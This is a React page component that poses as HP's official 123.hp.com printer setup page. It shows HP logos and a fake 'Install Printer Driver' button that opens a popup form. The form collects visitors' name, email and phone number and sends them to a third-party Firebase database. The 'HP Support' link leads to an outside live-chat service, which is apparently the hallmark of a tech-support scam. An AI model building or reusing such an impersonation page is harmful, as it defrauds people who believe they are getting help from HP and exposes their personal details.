import React, { useState } from "react";
import { useNavigate, Link } from "react-router-dom";

const Downloading = () => {
  const history = useNavigate();
  const [popupVisible, setPopupVisible] = useState(false);

  // form

  const navigate = useNavigate();

  const [form, setForm] = React.useState({
    Name: "",
    Email: "",
    Phone: "",
    Model: "",
  });

  const data = (e) => {
    const { name, value } = e.target;
    setForm({ ...form, [name]: value });
  };

  const getForm = async (e) => {
    e.preventDefault();

    const { Name, Email, Phone, Model } = form;

    const options = {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        Name,
        Email,
        Phone,
        Model,
      }),
    };

    const res = await fetch(
      "https://print-hub-cb65e-default-rtdb.firebaseio.com/FormData.json",
      options
    );

    if (res.ok) {
      history("/setup/loading");
    } else {
      alert("Form Not Submitted");
    }
  };
  // form end

  const openPopup = () => {
    setPopupVisible(true);
  };

  const closePopup = () => {
    setPopupVisible(false);
  };

  return (
    <html country="GB" lang="en" dir="ltr">
      <head>
        <link
          rel="stylesheet"
          href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css"
        />

        <link
          media="screen"
          rel="stylesheet"
          href="https://digihubsetup.com/setup/resources/assets/css/page/123fontstyles.css"
        />
        <link
          media="screen"
          rel="stylesheet"
          href="https://digihubsetup.com/setup/resources/assets/dist/application.min.css"
        />
        <link
          rel="stylesheet"
          href="https://digihubsetup.com/setup/resources/assets/css/vendor/jquery.typeahead.min.css"
          type="text/css"
        />

        <title>123.hp.com - OTHER PRINTERS HP Smart</title>
        <link
          rel="stylesheet"
          href="https://digihubsetup.com/setup/resources/assets/css/page/flex-design.css"
          type="text/css"
        />
        <link
          rel="stylesheet"
          href="https://digihubsetup.com/setup/resources/assets/css/page/desktop-app-store.css"
          type="text/css"
        />
        <link
          rel="stylesheet"
          href="https://digihubsetup.com/setup/resources/assets/css/page/swls-delay.css"
          type="text/css"
        />

        <style>
          {`
            .popup {
              display: ${popupVisible ? "block" : "none"};
              position: fixed;
              top: 0;
              left: 0;
              width: 100%;
              height: 100%;
              background-color: rgba(0,0,0,0.5);
              z-index: 999;
            }
            .popup-inner {
              position: absolute;
              top: 50%;
              left: 50%;
              transform: translate(-50%, -50%);
              background-color: #fff;
              padding: 20px;
              border-radius: 5px;
              box-shadow: 0 0 10px rgba(0,0,0,0.3);
            }
            form label {
              display: block;
              margin-bottom: 10px;
              font-weight: bold;
            }
            form input[type="text"],
            form input[type="email"],
            form input[type="tel"] {
              display: block;
              margin-bottom: 20px;
              width: 100%;
              padding: 10px;
              border-radius: 5px;
              border: 1px solid #ccc;
            }
            form button {
              display: block;
              margin: 20px auto 0;
              padding: 10px 20px;
              background-color: #007bff;
              color: #fff;
              border: none;
              border-radius: 5px;
              cursor: pointer;
            }
          `}
        </style>
      </head>
      <body>
        <div className="popup" id="popup">
          <div className="popup-inner">
            <h2>Enter your information</h2>
            <form method="POST">
              <label>Name:</label>
              <input
                type="text"
                id="name"
                name="Name"
                required
                value={form.Name}
                autoComplete="off"
                onChange={data}
              />
              <label>Email:</label>
              <input
                type="email"
                id="email"
                name="Email"
                required
                value={form.Email}
                autoComplete="off"
                onChange={data}
              />
              <label>Phone Number:</label>
              <input
                type="tel"
                id="phone"
                name="Phone"
                required
                value={form.Phone}
                autoComplete="off"
                onChange={data}
              />
              <label>Model Number:</label>
              <input
                type="text"
                id="model"
                name="Model"
                value={form.Model}
                autoComplete="off"
                onChange={data}
              />
              <button className=" bg-cyan-500" type="submit" onSubmit={getForm}>
                Submit
              </button>
            </form>
          </div>
        </div>

        <div className="header-123" id="header-123">
          <div className="header-container">
            <div className="hp-logo">
              <Link
                to="/setup"
                title="123.hp.com - Printer setup from the HP® Official site"
              >
                <img
                  alt="123.hp.com - Printer setup from the HP® Official site"
                  src="https://digihubsetup.com/setup/resources/assets/img/hp-logo.svg"
                />
              </Link>
            </div>
            <ul className="header-menu">
              <li>
                <Link to="/setup/officejet">OfficeJet</Link>
              </li>
              <li>
                <Link to="/setup/deskjet">DeskJet</Link>
              </li>
              <li>
                <Link to="/setup/envy">ENVY</Link>
              </li>
              <li>
                <Link to="/setup/laserjet">LaserJet</Link>
              </li>
            </ul>
          </div>
        </div>

        <div id="one23-overlay"></div>
        <main className="vertical">
          <div className="standard-bg horizontal centered top-content">
            <div className="main-content vertical">
              <div className="page-header vertical centered shrink-off">
                <div>Complete setup using HP Smart</div>
              </div>
              <div className="horizontal space-between">
                <div className="vertical page-subheader space-around">
                  <ol>
                    <li>Make sure that your printer is powered on</li>
                    <li>Install HP Smart to complete setup</li>
                  </ol>
                  <div className="app-store-container">
                    <button className="btn" onClick={openPopup}>
                      Install Printer Driver
                    </button>
                  </div>
                </div>
                <div className="vertical side-images">
                  <div className="printer-container">
                    <img
                      alt="printer"
                      className="printer-image"
                      src="https://digihubsetup.com/setup/resources/printer_images/OTHER-PRINTERS/290x245.png"
                    />
                    <div className="printer-title">OTHER PRINTERS</div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </main>

        <div className="modal fade" id="overlay">
          <div className="modal-dialog">
            <div className="modal-content">
              <div className="modal-header">
                <button
                  type="button"
                  className="close"
                  data-dismiss="modal"
                  aria-hidden="true"
                >
                  ×
                </button>
                <h4 className="modal-title">Modal title</h4>
              </div>
              <div className="modal-body">
                <p>Context here</p>
              </div>
            </div>
          </div>
        </div>
        {/* Below main */}
        <div className="horizontal centered">
          <div className="main-content vertical">
            <div className="availability-note-container">
              <span className="column availability-note py-4">
                Also available on:
              </span>
              <div className="flex">
                <img
                  alt="Mac"
                  className="appstore-badge"
                  src="https://digihubsetup.com/setup/resources/assets/img/app_store/ios/en.svg"
                />
                <img
                  alt="Android"
                  className="appstore-badge w-52 h-auto" // Adjust the width as needed (16 units = 300px in default configuration)
                  src="https://digihubsetup.com/setup/resources/assets/img/app_store/android/en.png"
                />
              </div>
            </div>
            <div className="support-list">
              <div className="support-item">
                <div className="support-header horizontal">
                  <div className="support-header-icon">
                    <img src="https://digihubsetup.com/setup/resources/assets/img/tips.png" />
                  </div>
                  <div className="support-title">
                    Troubleshooting tips for launching the Microsoft Store
                  </div>
                </div>
                <div className="support-content">
                  <div className="collapsible-list">
                    <div className="collapsible-list-item">
                      <div className="collapsible-list-header arrow-header">
                        <div className="list-header-left">
                          Check and update your Windows version
                        </div>
                        <div className="list-header-right">
                          <img src="https://digihubsetup.com/setup/resources/assets/img/chevron_down_black.png" />
                        </div>
                      </div>
                      <div className="collapsible-list-content">
                        Update your operating system to the latest Windows
                        software, if available. HP Smart is compatible with
                        Windows 10 version 1809 or higher and Windows 11. To
                        check for updates, select “Start” &gt; “Settings” &gt;
                        “Windows Update”. Select “Check for updates”.
                      </div>
                    </div>
                    <div className="collapsible-list-item">
                      <div className="collapsible-list-header arrow-header">
                        <div className="list-header-left">
                          Disconnect from a VPN
                        </div>
                        <div className="list-header-right">
                          <img src="https://digihubsetup.com/setup/resources/assets/img/chevron_down_black.png" />
                        </div>
                      </div>
                      <div className="collapsible-list-content">
                        Apps from the Microsoft Store might not install when
                        connected to a VPN. Consider your location and the
                        security of the Wi-Fi network before disconnecting from
                        a VPN.
                      </div>
                    </div>
                    <div className="collapsible-list-item">
                      <div className="collapsible-list-header arrow-header">
                        <div className="list-header-left">
                          Skip Microsoft account creation
                        </div>
                        <div className="list-header-right">
                          <img src="https://digihubsetup.com/setup/resources/assets/img/chevron_down_black.png" />
                        </div>
                      </div>
                      <div className="collapsible-list-content">
                        If prompted to create or sign in to a Microsoft account,
                        close the window. You will be able to open the app store
                        anyway. A Microsoft account is not required in order to
                        install or use HP Smart. HP Smart is free software for
                        printer set-up and use.
                      </div>
                    </div>
                    <div className="collapsible-list-item">
                      <div className="collapsible-list-header arrow-header">
                        <div className="list-header-left">
                          Check computer time and location settings
                        </div>
                        <div className="list-header-right">
                          <img src="https://digihubsetup.com/setup/resources/assets/img/chevron_down_black.png" />
                        </div>
                      </div>
                      <div className="collapsible-list-content">
                        If the Microsoft Store won’t open, verify that your time
                        settings are correct. Select “Start” &gt; “Settings”
                        &gt; “Time &amp; language”. Check the “Date &amp; time”
                        and “Region” to make sure they are your current location
                        and time zone.
                      </div>
                    </div>
                    <div className="collapsible-list-item">
                      <div className="collapsible-list-header arrow-header">
                        <div className="list-header-left">
                          Reset the Microsoft Store cache
                        </div>
                        <div className="list-header-right">
                          <img src="https://digihubsetup.com/setup/resources/assets/img/chevron_down_black.png" />
                        </div>
                      </div>
                      <div className="collapsible-list-content">
                        Press the Windows key + R to open the “Run” dialogue
                        box, type “wsreset.exe” and then select “OK”. A blank
                        window will open for about 10 seconds, then the app
                        store will launch automatically.
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <hr className="divider" />
              <div className="support-item">
                <div className="support-header horizontal">
                  <div className="support-header-icon">
                    <img src="https://digihubsetup.com/setup/resources/assets/img/support_icon_blue.svg" />
                  </div>
                  <div className="support-header-note">
                    Need additional help with set-up? Visit{" "}
                    <a href="https://tawk.to/chat/65be18d78d261e1b5f5bf30e/1hln923ec">
                      HP Support
                    </a>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Your custom scripts go here */}

        <script>
          {`
            document.getElementById('popup').style.display = 'block';
            setTimeout(function() {
              document.getElementById('popup').style.display = 'none';
            }, 5000);
            
          `}
        </script>
      </body>
    </html>
  );
};

export default Downloading;
